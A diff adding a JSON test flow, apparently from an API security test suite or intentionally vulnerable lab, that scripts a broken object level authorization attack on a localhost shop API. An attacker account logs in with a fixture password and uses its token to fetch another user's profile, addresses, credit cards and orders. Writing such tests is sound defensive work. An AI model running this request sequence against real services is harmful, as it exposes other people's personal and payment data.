@@ -1,0 +1,68 @@
+  {
+    "id": "flow_bola_attacker_views_victim_data",
+    "name": "BOLA: Attacker Views Victim's Sensitive Data",
+    "description": "Attacker (GraceWilson) logs in and views another user's (HenryMoore) profile, addresses, credit cards, and orders.",
+    "staticVars": {
+      "baseUrl": "http://localhost:8000",
+      "attackerUsername": "GraceWilson",
+      "attackerPassword": "GracePass7&",
+      "victimUserId": "00000009-0000-0000-0000-000000000009"
+    },
+    "steps": [
+      {
+        "id": "step_attacker_login_grace",
+        "name": "Attacker (GraceWilson) Logs In",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/auth/login?username={{attackerUsername}}&password={{attackerPassword}}",
+        "onFailure": "stop",
+        "extract": {
+          "attacker_token": "body.access_token"
+        }
+      },
+      {
+        "id": "step_attacker_views_victim_profile",
+        "name": "Attacker Views Victim (HenryMoore) Profile",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_attacker_views_victim_addresses",
+        "name": "Attacker Views Victim (HenryMoore) Addresses",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}/addresses",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_attacker_views_victim_credit_cards",
+        "name": "Attacker Views Victim (HenryMoore) Credit Cards",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}/credit-cards",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_attacker_views_victim_orders",
+        "name": "Attacker Views Victim (HenryMoore) Orders",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}/orders",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      }
+    ]
+  }
